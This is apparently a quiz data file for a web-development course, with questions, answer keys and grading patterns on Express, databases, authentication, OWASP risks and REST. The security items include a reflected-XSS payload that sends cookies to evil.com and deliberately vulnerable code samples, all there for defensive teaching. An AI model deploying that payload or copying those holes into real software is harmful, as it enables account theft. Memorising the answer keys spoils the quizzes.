          { difficulty: "average", type: "fill", q: "Complete the protected route that redirects unauthenticated users:", code: "function ProtectedRoute({ children }) {\n  const { user } = useAuth();\n  if (!user) return <___BLANK1___ to=\"/___BLANK2___\" />;\n  return children;\n}", blanks: [{ id: "BLANK1", options: ["Link", "Route", "Navigate", "Redirect"], answer: 2 }, { id: "BLANK2", options: ["home", "login", "dashboard", "register"], answer: 1 }] },
          { difficulty: "average", q: "What problem does React Query solve that useState + useEffect does not?", options: ["It adds routing capabilities", "It provides automatic caching, background refetching, stale data handling, and deduplication of requests", "It replaces React Router", "It only works with GraphQL"], answer: 1 },
          // Advanced
          { difficulty: "advanced", type: "freeform", q: "Create a React Context for a theme system. Include the provider component with toggle functionality and a custom useTheme hook.", starterCode: "const ThemeContext = createContext();\n\nfunction ThemeProvider({ children }) {\n  \n}\n\nfunction useTheme() {\n  \n}", patterns: ["createContext", "useState", "ThemeContext\\.Provider", "value.*theme|value.*toggle", "useContext.*ThemeContext", "return.*children|Provider.*children"], sampleAnswer: "const ThemeContext = createContext();\n\nfunction ThemeProvider({ children }) {\n  const [theme, setTheme] = useState('light');\n  const toggleTheme = () => setTheme(prev => prev === 'light' ? 'dark' : 'light');\n  return (\n    <ThemeContext.Provider value={{ theme, toggleTheme }}>\n      {children}\n    </ThemeContext.Provider>\n  );\n}\n\nfunction useTheme() {\n  const context = useContext(ThemeContext);\n  if (!context) throw new Error('useTheme must be used within ThemeProvider');\n  return context;\n}" },
          { difficulty: "advanced", type: "output", q: "What performance problem does this Context usage cause?", code: "const AppContext = createContext();\n\nfunction AppProvider({ children }) {\n  const [user, setUser] = useState(null);\n  const [theme, setTheme] = useState('light');\n  const [cart, setCart] = useState([]);\n  const [notifications, setNotifications] = useState([]);\n\n  return (\n    <AppContext.Provider value={{\n      user, setUser, theme, setTheme,\n      cart, setCart, notifications, setNotifications\n    }}>\n      {children}\n    </AppContext.Provider>\n  );\n}", options: ["No problem — this is the recommended pattern", "Any state change re-renders ALL consumers, even if they only use one value (e.g., theme change re-renders cart components)", "Context cannot hold more than 2 values", "The Provider creates memory leaks"], answer: 1 },
          { difficulty: "advanced", q: "A large app needs global state for: auth, theme, shopping cart, and notifications. What is the best architecture?", options: ["One giant Context for everything", "Separate Contexts for each concern, or use Zustand/Redux Toolkit with slices for complex state and React Query for server data", "Only use useState in every component", "Store everything in localStorage and read from there"], answer: 1 },
        ]
      }
    ]
  },
  {
    id: 8, title: "Node/Express", icon: "\u{1F5A5}\uFE0F", color: "#339933", desc: "Backend Dev",
    lessons: [
      {
        title: "Express Server Basics",
        slides: [
          { type: "teach", content: "**Express** is a minimal Node.js framework for building APIs. Create routes with `app.get()`, `app.post()`, etc. Each route has a handler function.", highlight: "Express" },
          { type: "teach", content: "**Middleware** functions run between request and response. They can log, authenticate, validate, or transform data. Call `next()` to pass control along.", highlight: "Middleware" },
        ],
        questions: [
          { q: "Express is a framework for:", options: ["React", "Node.js servers", "CSS", "Databases"], answer: 1 },
          { q: "Middleware runs:", options: ["Only on errors", "Between request and response", "After the page loads", "Only once"], answer: 1 },
          { q: "To send JSON from Express, use:", options: ["res.write()", "res.json()", "res.html()", "res.send.json()"], answer: 1 },
          // Average
          { difficulty: "average", type: "output", q: "What does the server log when GET /api/data is requested?", code: "app.use((req, res, next) => {\n  console.log('A: global middleware');\n  next();\n});\n\napp.use('/api', (req, res, next) => {\n  console.log('B: api middleware');\n  next();\n});\n\napp.get('/api/data', (req, res) => {\n  console.log('C: route handler');\n  res.json({ ok: true });\n});", options: ["Only 'C: route handler'", "'A: global middleware' then 'B: api middleware' then 'C: route handler'", "'B: api middleware' then 'A: global middleware' then 'C: route handler'", "An error because too many middleware"], answer: 1 },
          { difficulty: "average", type: "fill", q: "Complete the Express error-handling middleware:", code: "app.use((___BLANK1___, req, res, next) => {\n  console.error(err.stack);\n  res.status(___BLANK2___).json({ error: 'Something went wrong' });\n});", blanks: [{ id: "BLANK1", options: ["req", "err", "error", "msg"], answer: 1 }, { id: "BLANK2", options: ["200", "404", "500", "401"], answer: 2 }] },
          { difficulty: "average", q: "What happens if a middleware function does NOT call next() and does NOT send a response?", options: ["The request continues to the next handler automatically", "The request hangs indefinitely until it times out", "Express throws an error", "The browser retries the request"], answer: 1 },
          // Advanced
          { difficulty: "advanced", type: "freeform", q: "Write an Express middleware that logs the HTTP method, URL path, response status code, and time elapsed for every request.", starterCode: "const requestLogger = (req, res, next) => {\n  \n};", patterns: ["req\\.method", "req\\.url|req\\.path|req\\.originalUrl", "Date\\.now|performance\\.now|process\\.hrtime", "res\\.on.*finish|res\\.statusCode", "next\\("], sampleAnswer: "const requestLogger = (req, res, next) => {\n  const start = Date.now();\n  res.on('finish', () => {\n    const duration = Date.now() - start;\n    console.log(`${req.method} ${req.originalUrl} ${res.statusCode} - ${duration}ms`);\n  });\n  next();\n};" },
          { difficulty: "advanced", type: "output", q: "What is the critical bug in this route handler?", code: "app.get('/api/users/:id', async (req, res) => {\n  const user = await db.findUser(req.params.id);\n  res.json(user);\n  \n  const logs = await db.logAccess(req.params.id);\n  res.json({ user, logs });\n});", options: ["The async/await syntax is wrong", "It calls res.json() twice — the second call throws 'headers already sent' error because the response was already completed", "The params.id needs parseInt", "There is no bug in this code"], answer: 1 },
          { difficulty: "advanced", type: "order", q: "Arrange Express middleware in the correct registration order for a typical API:", lines: ["CORS middleware (app.use(cors()))", "Body parser (app.use(express.json()))", "Request logger middleware", "Authentication middleware", "API route handlers", "404 catch-all handler", "Error-handling middleware (4 params)"], correctOrder: [0, 1, 2, 3, 4, 5, 6] },
        ]
      },
      {
        title: "Project Structure & Validation",
        slides: [
          { type: "teach", content: "Organize backend code into folders: **routes/** (URLs), **controllers/** (handlers), **models/** (data), **middleware/** (auth, validation), **services/** (logic).", highlight: "folders" },
          { type: "teach", content: "ALWAYS validate user input on the server. Never trust the client. Use libraries like **express-validator** or **Zod** to validate and sanitize.", highlight: "validate" },
        ],
        questions: [
          { q: "Controllers handle:", options: ["Database schemas", "Request/response logic", "CSS styles", "Git merges"], answer: 1 },
          { q: "Input validation should happen:", options: ["Only on the frontend", "Only on the backend", "On BOTH frontend and backend", "Never"], answer: 2 },
          { q: "Environment variables store:", options: ["HTML templates", "Secrets and configuration", "CSS variables", "Test results"], answer: 1 },
          // Average
          { difficulty: "average", type: "output", q: "What does this Zod validation return for the given input?", code: "const userSchema = z.object({\n  name: z.string().min(2),\n  email: z.string().email(),\n  age: z.number().min(18)\n});\n\nuserSchema.safeParse({\n  name: 'A',\n  email: 'not-an-email',\n  age: 15\n});", options: ["{ success: true, data: {...} }", "{ success: false } with errors: name too short, invalid email, age below 18", "It throws an uncaught exception", "Only the email error is reported"], answer: 1 },
          { difficulty: "average", type: "order", q: "Arrange the request flow through a properly structured Express app:", lines: ["Request hits route definition (routes/users.js)", "Route calls validation middleware", "Validated request hits controller (controllers/userController.js)", "Controller calls service layer (services/userService.js)", "Service interacts with model/database (models/User.js)", "Controller sends response back to client"], correctOrder: [0, 1, 2, 3, 4, 5] },
          { difficulty: "average", type: "fill", q: "Complete the environment variable setup:", code: "// .env file\nDATABASE_URL=postgres://localhost/mydb\nJWT_SECRET=supersecret123\n\n// server.js\nrequire('___BLANK1___').config();\nconst dbUrl = process.___BLANK2___.DATABASE_URL;", blanks: [{ id: "BLANK1", options: ["express", "dotenv", "config", "env"], answer: 1 }, { id: "BLANK2", options: ["config", "env", "vars", "settings"], answer: 1 }] },
          // Advanced
          { difficulty: "advanced", type: "freeform", q: "Write an Express validation middleware using Zod that validates a user registration body (name: string min 2, email: valid email, password: min 8 chars). Return 400 with formatted errors if invalid.", starterCode: "const { z } = require('zod');\n\nconst registerSchema = z.object({\n  \n});\n\nconst validateRegistration = (req, res, next) => {\n  \n};", patterns: ["z\\.string", "z\\.object", "email|min", "safeParse|parse", "400|Bad Request", "next\\("], sampleAnswer: "const { z } = require('zod');\n\nconst registerSchema = z.object({\n  name: z.string().min(2, 'Name must be at least 2 characters'),\n  email: z.string().email('Invalid email address'),\n  password: z.string().min(8, 'Password must be at least 8 characters')\n});\n\nconst validateRegistration = (req, res, next) => {\n  const result = registerSchema.safeParse(req.body);\n  if (!result.success) {\n    return res.status(400).json({ errors: result.error.flatten().fieldErrors });\n  }\n  req.body = result.data;\n  next();\n};" },
          { difficulty: "advanced", type: "output", q: "What is wrong with this project structure?", code: "// routes/users.js\nrouter.post('/users', async (req, res) => {\n  const { name, email, password } = req.body;\n  const hashedPw = await bcrypt.hash(password, 10);\n  const user = await db.query(\n    'INSERT INTO users (name, email, password) VALUES ($1, $2, $3)',\n    [name, email, hashedPw]\n  );\n  const token = jwt.sign({ id: user.id }, process.env.SECRET);\n  res.status(201).json({ user, token });\n});", options: ["The SQL syntax is wrong", "Everything is in the route handler — validation, hashing, DB query, and JWT all need separating into middleware, controller, and service layers", "bcrypt should not be used with async/await", "The route path should be /api/users"], answer: 1 },
          { difficulty: "advanced", q: "Why should validation happen on BOTH frontend and backend, rather than just one?", options: ["Duplication is always bad — pick one place only", "Frontend validation improves UX (instant feedback); backend validation is the security gate (clients can bypass frontend checks)", "Backend validation is optional if frontend validation is thorough", "Frontend validation is more secure than backend validation"], answer: 1 },
        ]
      }
    ]
  },
  {
    id: 9, title: "Databases", icon: "\u{1F5C4}\uFE0F", color: "#336791", desc: "SQL & NoSQL",
    lessons: [
      {
        title: "SQL & PostgreSQL",
        slides: [
          { type: "teach", content: "**SQL databases** store data in structured **tables** with rows and columns. **Relationships** connect tables using foreign keys. Think: organized spreadsheets.", highlight: "tables" },
          { type: "teach", content: "**CRUD** in SQL: INSERT (create), SELECT (read), UPDATE (modify), DELETE (remove). **JOINs** combine data from multiple tables \u2014 the most powerful SQL feature.", highlight: "JOINs" },
        ],
        questions: [
          { q: "SQL databases store data in:", options: ["Documents", "Tables with rows/columns", "Key-value pairs", "Files"], answer: 1 },
          { q: "A JOIN does what?", options: ["Deletes tables", "Combines data from multiple tables", "Creates indexes", "Backs up data"], answer: 1 },
          { q: "Which SQL command reads data?", options: ["INSERT", "UPDATE", "SELECT", "DELETE"], answer: 2 },
          // Average
          { difficulty: "average", type: "output", q: "What does this query return?", code: "SELECT users.name, COUNT(orders.id) AS order_count\nFROM users\nLEFT JOIN orders ON users.id = orders.user_id\nGROUP BY users.name\nHAVING COUNT(orders.id) > 5\nORDER BY order_count DESC;", options: ["All users and their orders", "Only users with more than 5 orders, sorted by order count descending", "Users with exactly 5 orders", "An error because LEFT JOIN cannot use HAVING"], answer: 1 },
          { difficulty: "average", type: "fill", q: "Complete the SQL query to find users who have NOT placed any orders:", code: "SELECT users.name\nFROM users\n___BLANK1___ JOIN orders ON users.id = orders.user_id\nWHERE orders.id IS ___BLANK2___;", blanks: [{ id: "BLANK1", options: ["INNER", "LEFT", "RIGHT", "CROSS"], answer: 1 }, { id: "BLANK2", options: ["EMPTY", "ZERO", "NULL", "NONE"], answer: 2 }] },
          { difficulty: "average", q: "What is the difference between WHERE and HAVING in SQL?", options: ["They are identical and interchangeable", "WHERE filters rows before grouping; HAVING filters groups after GROUP BY aggregation", "HAVING is deprecated in modern SQL", "WHERE only works with numbers; HAVING works with strings"], answer: 1 },
          // Advanced
          { difficulty: "advanced", type: "freeform", q: "Write a SQL migration to create a 'products' table with: id (auto-increment primary key), name (unique, not null), price (decimal, not null, check > 0), category_id (foreign key to categories table), and created_at (default to current timestamp).", starterCode: "CREATE TABLE products (\n  \n);", patterns: ["PRIMARY KEY|SERIAL|GENERATED", "UNIQUE|NOT NULL", "DECIMAL|NUMERIC", "CHECK|>\\s*0", "REFERENCES|FOREIGN KEY", "DEFAULT.*NOW|DEFAULT.*CURRENT"], sampleAnswer: "CREATE TABLE products (\n  id SERIAL PRIMARY KEY,\n  name VARCHAR(255) UNIQUE NOT NULL,\n  price DECIMAL(10, 2) NOT NULL CHECK (price > 0),\n  category_id INTEGER REFERENCES categories(id),\n  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n);" },
          { difficulty: "advanced", type: "output", q: "What performance issue does this query have on a table with 10 million rows?", code: "SELECT * FROM products\nWHERE LOWER(name) LIKE '%laptop%'\nORDER BY created_at DESC;", options: ["No issue — databases handle this efficiently", "Full table scan: LIKE with leading wildcard cannot use indexes, LOWER() prevents index usage, and SELECT * fetches unnecessary columns", "The ORDER BY is the only bottleneck", "LIKE queries are always fast"], answer: 1 },
          { difficulty: "advanced", q: "When should you add a database index?", options: ["On every column to maximize speed", "On columns frequently used in WHERE, JOIN, and ORDER BY clauses — but not excessively, as indexes slow down writes", "Only on primary keys", "Indexes are not needed in PostgreSQL"], answer: 1 },
        ]
      },
      {
        title: "MongoDB & ORMs",
        slides: [
          { type: "teach", content: "**MongoDB** stores data as flexible **documents** (JSON-like). No rigid schema needed \u2014 great for data that evolves. But less structured than SQL.", highlight: "documents" },
          { type: "teach", content: "**ORMs** (like Prisma) let you interact with databases using JavaScript instead of raw SQL. Define your schema in code, get type safety and migrations.", highlight: "Prisma" },
        ],
        questions: [
          { q: "MongoDB stores data as:", options: ["Tables", "JSON-like documents", "Spreadsheets", "XML files"], answer: 1 },
          { q: "An ORM lets you:", options: ["Write CSS", "Use JS instead of raw SQL", "Deploy servers", "Create React components"], answer: 1 },
          { q: "Choose SQL when you need:", options: ["Flexible schemas", "Complex relationships and joins", "Real-time data only", "No structure"], answer: 1 },
          // Average
          { difficulty: "average", type: "output", q: "What does this Prisma query return?", code: "const users = await prisma.user.findMany({\n  where: {\n    email: { contains: '@gmail.com' },\n    posts: { some: { published: true } }\n  },\n  include: {\n    posts: { where: { published: true } }\n  },\n  orderBy: { createdAt: 'desc' },\n  take: 10\n});", options: ["All users in the database", "The 10 most recent Gmail users who have at least one published post, with their published posts included", "Only the posts, not the users", "An error because you cannot filter and include simultaneously"], answer: 1 },
          { difficulty: "average", type: "fill", q: "Complete the MongoDB query to find and update a document:", code: "db.users.___BLANK1___(\n  { email: 'alice@test.com' },\n  { ___BLANK2___: { name: 'Alice Smith', updatedAt: new Date() } }\n);", blanks: [{ id: "BLANK1", options: ["find", "findOneAndUpdate", "insert", "delete"], answer: 1 }, { id: "BLANK2", options: ["$push", "$set", "$update", "$replace"], answer: 1 }] },
          { difficulty: "average", q: "What is the N+1 query problem in ORMs?", options: ["Queries that return null", "Fetching a list (1 query) then fetching related data for each item individually (N queries) instead of using a join or eager loading", "Having more than one database connection", "Writing N queries when 1 would fail"], answer: 1 },
          // Advanced
          { difficulty: "advanced", type: "freeform", q: "Write a Prisma schema for a blog with User, Post, and Comment models. Users have many posts, posts have many comments, and comments belong to both a user and a post.", starterCode: "// schema.prisma\n\nmodel User {\n  \n}\n\nmodel Post {\n  \n}\n\nmodel Comment {\n  \n}", patterns: ["model User", "model Post", "model Comment", "\\@id.*\\@default", "\\@relation|Int|String", "posts.*Post\\[\\]|Post\\[\\].*posts", "author.*User|user.*User"], sampleAnswer: "// schema.prisma\n\nmodel User {\n  id       Int       @id @default(autoincrement())\n  email    String    @unique\n  name     String\n  posts    Post[]\n  comments Comment[]\n}\n\nmodel Post {\n  id        Int       @id @default(autoincrement())\n  title     String\n  content   String\n  published Boolean   @default(false)\n  author    User      @relation(fields: [authorId], references: [id])\n  authorId  Int\n  comments  Comment[]\n}\n\nmodel Comment {\n  id       Int    @id @default(autoincrement())\n  text     String\n  post     Post   @relation(fields: [postId], references: [id])\n  postId   Int\n  author   User   @relation(fields: [authorId], references: [id])\n  authorId Int\n}" },
          { difficulty: "advanced", q: "You are building an e-commerce app. Product catalog has strict relationships (categories, inventory, orders). User reviews are free-form with varying fields. Which database strategy is best?", options: ["Use only SQL for everything", "Use only MongoDB for everything", "SQL (PostgreSQL) for transactional data (orders, inventory); MongoDB or a JSON column for flexible data (reviews, user preferences)", "Use a flat-file database for simplicity"], answer: 2 },
          { difficulty: "advanced", type: "output", q: "What issue does this MongoDB schema design cause at scale?", code: "// User document:\n{\n  _id: ObjectId('...'),\n  name: 'Alice',\n  posts: [\n    { title: 'Post 1', content: '...(5000 words)...',\n      comments: [{ text: '...' }, ...] },\n    { title: 'Post 2', content: '...(3000 words)...',\n      comments: [{ text: '...' }, ...] },\n    // ... hundreds more posts\n  ]\n}", options: ["No issue — embedding is always preferred in MongoDB", "The document grows unbounded and will hit MongoDB's 16MB document size limit; posts and comments should be separate collections with references", "MongoDB cannot store arrays", "This design is optimal for read performance"], answer: 1 },
        ]
      }
    ]
  },
  {
    id: 10, title: "Auth & Security", icon: "\u{1F510}", color: "#E74C3C", desc: "JWT, OAuth, OWASP",
    lessons: [
      {
        title: "Authentication & Authorization",
        slides: [
          { type: "teach", content: "**Authentication** = proving WHO you are (login). **Authorization** = what you're ALLOWED to do (permissions). JWT tokens carry both in a signed payload.", highlight: "JWT" },
          { type: "teach", content: "Hash passwords with **bcrypt** (never store plain text!). Use **httpOnly cookies** for tokens (not localStorage). Implement **rate limiting** against brute force.", highlight: "bcrypt" },
        ],
        questions: [
          { q: "Authentication verifies:", options: ["What you can access", "Who you are", "Your IP address", "Your browser"], answer: 1 },
          { q: "Passwords should be stored as:", options: ["Plain text", "Encrypted", "Bcrypt hashes", "Base64 encoded"], answer: 2 },
          { q: "JWT stands for:", options: ["Java Web Token", "JSON Web Token", "JavaScript Widget Tool", "Just Web Tech"], answer: 1 },
          // Average
          { difficulty: "average", type: "output", q: "What does this JWT payload contain after decoding?", code: "// JWT token (decoded payload):\n{\n  \"sub\": \"user_123\",\n  \"role\": \"admin\",\n  \"iat\": 1700000000,\n  \"exp\": 1700003600\n}\n// Current time: 1700005000", options: ["A valid admin user session", "An expired token — exp (3600s after issue) has passed, the server should reject it with 401", "An invalid token because 'sub' should be a number", "The token has no useful information"], answer: 1 },
          { difficulty: "average", type: "fill", q: "Complete the password hashing and comparison:", code: "// Registration: hash the password\nconst hash = await bcrypt.___BLANK1___(password, 10);\n\n// Login: compare entered password with stored hash\nconst isMatch = await bcrypt.___BLANK2___(password, storedHash);", blanks: [{ id: "BLANK1", options: ["encrypt", "hash", "encode", "sign"], answer: 1 }, { id: "BLANK2", options: ["match", "verify", "compare", "check"], answer: 2 }] },
          { difficulty: "average", q: "Why should JWT tokens be stored in httpOnly cookies instead of localStorage?", options: ["localStorage is slower than cookies", "httpOnly cookies are inaccessible to JavaScript, preventing XSS attacks from stealing the token", "localStorage has a 1KB size limit", "Cookies are encrypted automatically"], answer: 1 },
          // Advanced
          { difficulty: "advanced", type: "freeform", q: "Write an Express middleware that checks both authentication (valid JWT) and authorization (user role). The middleware should accept an array of allowed roles.", starterCode: "const authorize = (allowedRoles) => {\n  return (req, res, next) => {\n    \n  };\n};\n\n// Usage: app.delete('/admin/users/:id', authorize(['admin']), deleteUser);", patterns: ["req\\.headers|authorization|Authorization", "jwt\\.verify|verify", "role|roles", "allowedRoles.*includes|includes.*role", "401|403", "next\\("], sampleAnswer: "const authorize = (allowedRoles) => {\n  return (req, res, next) => {\n    const authHeader = req.headers.authorization;\n    if (!authHeader) return res.status(401).json({ error: 'No token provided' });\n    \n    const token = authHeader.split(' ')[1];\n    try {\n      const decoded = jwt.verify(token, process.env.JWT_SECRET);\n      req.user = decoded;\n      \n      if (!allowedRoles.includes(decoded.role)) {\n        return res.status(403).json({ error: 'Insufficient permissions' });\n      }\n      next();\n    } catch (err) {\n      res.status(401).json({ error: 'Invalid token' });\n    }\n  };\n};" },
          { difficulty: "advanced", type: "output", q: "What is the security vulnerability in this login endpoint?", code: "app.post('/login', async (req, res) => {\n  const user = await db.findByEmail(req.body.email);\n  if (!user) {\n    return res.status(404).json({ error: 'User not found' });\n  }\n  const valid = await bcrypt.compare(req.body.password, user.hash);\n  if (!valid) {\n    return res.status(401).json({ error: 'Wrong password' });\n  }\n  const token = jwt.sign({ id: user.id }, SECRET);\n  res.json({ token });\n});", options: ["bcrypt.compare is insecure", "User enumeration: different error messages for 'user not found' vs 'wrong password' let attackers discover valid emails. Use a generic message for both cases.", "The JWT has no expiration", "Both B and C are vulnerabilities"], answer: 3 },
          { difficulty: "advanced", q: "Why is bcrypt preferred over SHA-256 for password hashing?", options: ["bcrypt produces shorter hashes", "bcrypt is deliberately slow with a configurable cost factor, making brute-force attacks impractical. SHA-256 is too fast (billions of hashes/second)", "SHA-256 is deprecated", "bcrypt works on all platforms; SHA-256 does not"], answer: 1 },
        ]
      },
      {
        title: "OAuth & Sessions",
        slides: [
          { type: "teach", content: "**OAuth 2.0** lets users log in with Google, GitHub, etc. without sharing their password with your app. Your app gets a **token** from the provider.", highlight: "OAuth 2.0" },
          { type: "teach", content: "**Sessions** store user state on the server (in memory or Redis). **Cookies** carry the session ID. Sessions expire for security \u2014 balance UX vs. safety.", highlight: "Sessions" },
        ],
        questions: [
          { q: "OAuth lets users sign in using:", options: ["Only email/password", "Third-party providers like Google", "Their IP address", "SMS only"], answer: 1 },
          { type: "fill", q: "Complete the OAuth flow:", code: "User clicks \"Login with Google\"\nApp redirects to ___BLANK1___\nUser grants permission\nGoogle sends back an ___BLANK2___", blanks: [{ id: "BLANK1", options: ["your database", "Google's auth server", "localhost", "the CDN"], answer: 1 }, { id: "BLANK2", options: ["password", "access token", "HTML page", "cookie"], answer: 1 }] },
          { q: "Session data is stored:", options: ["In the browser only", "On the server", "In the URL", "In CSS"], answer: 1 },
          // Average
          { difficulty: "average", type: "order", q: "Arrange the OAuth 2.0 Authorization Code flow in correct order:", lines: ["User clicks 'Login with GitHub' on your app", "Your app redirects to GitHub's authorization endpoint with client_id and redirect_uri", "User authenticates with GitHub and grants permission", "GitHub redirects back to your app with an authorization code", "Your server exchanges the code for an access token (using client_secret)", "Your server uses the access token to fetch user profile from GitHub API"], correctOrder: [0, 1, 2, 3, 4, 5] },
          { difficulty: "average", type: "output", q: "What is the purpose of the 'state' parameter in this OAuth redirect?", code: "const authUrl = 'https://github.com/login/oauth/authorize'\n  + '?client_id=abc123'\n  + '&redirect_uri=https://myapp.com/callback'\n  + '&scope=read:user'\n  + '&state=xY9kL2mN';  // random string", options: ["It stores the user's name", "It prevents CSRF attacks — the app verifies the same state value returns in the callback", "It is the user's session ID", "It is optional and has no security purpose"], answer: 1 },
          { difficulty: "average", q: "What is the difference between an access token and a refresh token?", options: ["They are the same thing with different names", "Access tokens are short-lived (minutes/hours) for API requests; refresh tokens are long-lived and used to get new access tokens without re-login", "Refresh tokens are less secure than access tokens", "Access tokens are stored on the server; refresh tokens on the client only"], answer: 1 },
          // Advanced
          { difficulty: "advanced", type: "freeform", q: "Write Express session configuration using express-session with Redis as the session store. Include secure cookie settings for production.", starterCode: "const session = require('express-session');\nconst RedisStore = require('connect-redis').default;\n\napp.use(session({\n  \n}));", patterns: ["store.*Redis|RedisStore", "secret", "cookie.*secure|secure.*true", "httpOnly|sameSite", "resave|saveUninitialized", "maxAge|expires"], sampleAnswer: "const session = require('express-session');\nconst RedisStore = require('connect-redis').default;\n\napp.use(session({\n  store: new RedisStore({ client: redisClient }),\n  secret: process.env.SESSION_SECRET,\n  resave: false,\n  saveUninitialized: false,\n  cookie: {\n    secure: process.env.NODE_ENV === 'production',\n    httpOnly: true,\n    sameSite: 'lax',\n    maxAge: 24 * 60 * 60 * 1000  // 24 hours\n  }\n}));" },
          { difficulty: "advanced", q: "Your app uses JWT tokens (stateless). A user's account is compromised. How do you immediately invalidate their token?", options: ["You cannot — JWTs are stateless and valid until expiration. You need a token blocklist (in Redis) or short expiry with refresh token rotation", "Change the user's password — that automatically invalidates the JWT", "Delete the token from localStorage", "Restart the server to clear all tokens"], answer: 0 },
          { difficulty: "advanced", type: "output", q: "What security issue exists in this session cookie configuration?", code: "app.use(session({\n  secret: 'keyboard cat',\n  cookie: {\n    secure: false,\n    httpOnly: false,\n    sameSite: 'none',\n    maxAge: 30 * 24 * 60 * 60 * 1000 // 30 days\n  }\n}));", options: ["The maxAge is too short", "Multiple issues: weak secret, secure=false allows HTTP interception, httpOnly=false enables XSS token theft, sameSite=none allows CSRF, and 30-day session is excessive", "The configuration is secure and production-ready", "Only the secret needs changing"], answer: 1 },
        ]
      },
      {
        title: "OWASP Top 10",
        slides: [
          { type: "teach", content: "The **OWASP Top 10** lists the most critical web security risks: **Injection** (SQL/XSS), **Broken Auth**, **Sensitive Data Exposure**, and more.", highlight: "OWASP Top 10" },
          { type: "teach", content: "Defend with: **parameterized queries** (SQL injection), **sanitize output** (XSS), **HTTPS everywhere**, **CSRF tokens**, and **Content Security Policy** headers.", highlight: "parameterized queries" },
        ],
        questions: [
          { type: "output", q: "What vulnerability does this code have?", code: "const query = `SELECT * FROM users\n  WHERE name = '${req.body.name}'`;", options: ["XSS attack", "SQL Injection", "CSRF attack", "No vulnerability"], answer: 1 },
          { q: "To prevent XSS attacks, you should:", options: ["Use plain HTTP", "Sanitize/escape user output", "Store passwords in plain text", "Disable CORS"], answer: 1 },
          { q: "HTTPS protects data:", options: ["Only on the server", "In transit between client and server", "In the database", "In localStorage"], answer: 1 },
          // Average
          { difficulty: "average", type: "output", q: "What attack does this code enable?", code: "// Express route\napp.get('/search', (req, res) => {\n  const query = req.query.q;\n  res.send(`<h1>Results for: ${query}</h1>`);\n});\n\n// Attacker sends:\n// /search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>", options: ["SQL Injection", "Reflected XSS — user input is rendered as HTML without escaping, allowing script execution that steals cookies", "CSRF attack", "Path traversal attack"], answer: 1 },
          { difficulty: "average", type: "fill", q: "Complete the parameterized query to prevent SQL injection:", code: "// VULNERABLE:\n// const q = `SELECT * FROM users WHERE id = ${userId}`;\n\n// SAFE:\nconst result = await db.query(\n  'SELECT * FROM users WHERE id = ___BLANK1___',\n  [___BLANK2___]\n);", blanks: [{ id: "BLANK1", options: ["${userId}", "?", "$1", ":id"], answer: 2 }, { id: "BLANK2", options: ["'userId'", "req.body", "userId", "{userId}"], answer: 2 }] },
          { difficulty: "average", q: "What is a CSRF attack?", options: ["Stealing database credentials", "Tricking a logged-in user's browser into making unwanted requests to a site where they are authenticated (e.g., transferring money)", "Brute-forcing passwords", "Injecting SQL through form fields"], answer: 1 },
          // Advanced
          { difficulty: "advanced", type: "freeform", q: "Write Express middleware that sets security headers: Content-Security-Policy (restrict scripts to same origin), X-Content-Type-Options, X-Frame-Options, and Strict-Transport-Security.", starterCode: "const securityHeaders = (req, res, next) => {\n  \n};", patterns: ["Content-Security-Policy", "X-Content-Type-Options|nosniff", "X-Frame-Options|DENY|SAMEORIGIN", "Strict-Transport-Security|HSTS|max-age", "res\\.setHeader|res\\.set", "next\\("], sampleAnswer: "const securityHeaders = (req, res, next) => {\n  res.setHeader('Content-Security-Policy', \"default-src 'self'; script-src 'self'\");\n  res.setHeader('X-Content-Type-Options', 'nosniff');\n  res.setHeader('X-Frame-Options', 'DENY');\n  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');\n  next();\n};" },
          { difficulty: "advanced", type: "output", q: "Identify ALL the vulnerabilities in this code:", code: "app.post('/transfer', (req, res) => {\n  const { to, amount } = req.body;\n  const query = `UPDATE accounts\n    SET balance = balance - ${amount}\n    WHERE user_id = '${req.session.userId}'`;\n  db.query(query);\n  db.query(`UPDATE accounts\n    SET balance = balance + ${amount}\n    WHERE user_id = '${to}'`);\n  res.send(`Transferred $${amount} to ${to}`);\n});", options: ["Only SQL injection", "Only XSS in the response", "SQL injection (string interpolation), XSS (unescaped output), no CSRF protection, no input validation, no transaction (partial failure risk), and no authorization check", "The code is secure"], answer: 2 },
          { difficulty: "advanced", type: "order", q: "Arrange these security measures from most critical (implement first) to nice-to-have:", lines: ["HTTPS everywhere (TLS)", "Input validation and parameterized queries", "Authentication and password hashing", "Security headers (CSP, HSTS)", "Rate limiting and brute-force protection", "Regular dependency audits (npm audit)"], correctOrder: [0, 1, 2, 3, 4, 5] },
        ]
      }
    ]
  },
  {
    id: 11, title: "APIs", icon: "\u{1F517}", color: "#3498DB", desc: "REST & GraphQL",
    lessons: [
      {
        title: "REST API Design",
        slides: [
          { type: "teach", content: "REST APIs use **resource-based URLs** (nouns, not verbs): `/api/products` not `/api/getProducts`. HTTP methods define the action.", highlight: "resource-based" },
          { type: "teach", content: "Good APIs have: **versioning** (/v1/), **pagination**, **filtering**, consistent **error responses**, and proper **status codes**.", highlight: "versioning" },
        ],
        questions: [
          { q: "RESTful URLs should use:", options: ["Verbs (getUser)", "Nouns (users)", "Random strings", "Numbers only"], answer: 1 },
          { q: "API versioning looks like:", options: ["/api/products", "/v1/api/products", "/api/v1/products", "/products/v1"], answer: 2 },
          { q: "For a list of 10,000 items, use:", options: ["Send all at once", "Pagination", "Delete most of them", "Compress to 1 item"], answer: 1 },
          // Average
          { difficulty: "average", type: "output", q: "What HTTP status should this endpoint return on success?", code: "app.post('/api/v1/users', (req, res) => {\n  const user = db.create(req.body);\n  res.status(???).json(user);\n});", options: ["200 OK", "201 Created", "204 No Content", "301 Moved"], answer: 1 },
          { difficulty: "average", type: "fill", q: "Complete the RESTful route for updating a specific product:", code: "app.___BLANK1___('/api/v1/___BLANK2___/:id', updateProduct);", blanks: [{ id: "BLANK1", options: ["get", "post", "put", "delete"], answer: 2 }, { id: "BLANK2", options: ["getProduct", "updateProduct", "products", "product-update"], answer: 2 }] },
          { difficulty: "average", type: "output", q: "Which URL is NOT RESTful?", code: "A: GET    /api/v1/users/42\nB: POST   /api/v1/users\nC: GET    /api/v1/getActiveUsers\nD: DELETE /api/v1/users/42", options: ["A - uses an ID in path", "B - creates with POST", "C - uses a verb in the URL", "D - uses DELETE method"], answer: 2 },
          // Advanced
